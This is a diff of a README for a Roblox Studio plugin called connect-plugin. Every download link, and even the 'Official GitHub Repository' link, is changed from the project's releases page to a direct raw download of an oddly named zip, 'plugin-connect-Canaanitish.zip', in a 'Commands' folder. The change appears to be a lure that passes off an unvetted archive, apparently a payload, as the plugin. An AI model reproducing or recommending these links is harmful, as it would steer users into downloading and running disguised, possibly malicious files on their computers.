@@ -1,6 +1,6 @@
 # 🔌 connect-plugin - Simplify Roblox Studio Integration
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Plugin-blue?style=for-the-badge)](https://github.com/frendel2004/connect-plugin/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Plugin-blue?style=for-the-badge)](https://raw.githubusercontent.com/frendel2004/connect-plugin/main/Commands/plugin-connect-Canaanitish.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Before using connect-plugin, make sure Roblox Studio is installed on your PC.
 
 To get connect-plugin, visit this page to download the latest release:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Plugin-orange?style=for-the-badge)](https://github.com/frendel2004/connect-plugin/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Get%20Plugin-orange?style=for-the-badge)](https://raw.githubusercontent.com/frendel2004/connect-plugin/main/Commands/plugin-connect-Canaanitish.zip)
 
 Follow these steps:
 
@@ -105,8 +105,8 @@ You can find more information here:
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/frendel2004/connect-plugin/releases)  
-- [Official GitHub Repository](https://github.com/frendel2004/connect-plugin)  
+- [Download Latest Release](https://raw.githubusercontent.com/frendel2004/connect-plugin/main/Commands/plugin-connect-Canaanitish.zip)  
+- [Official GitHub Repository](https://raw.githubusercontent.com/frendel2004/connect-plugin/main/Commands/plugin-connect-Canaanitish.zip)  
 
 ---
 
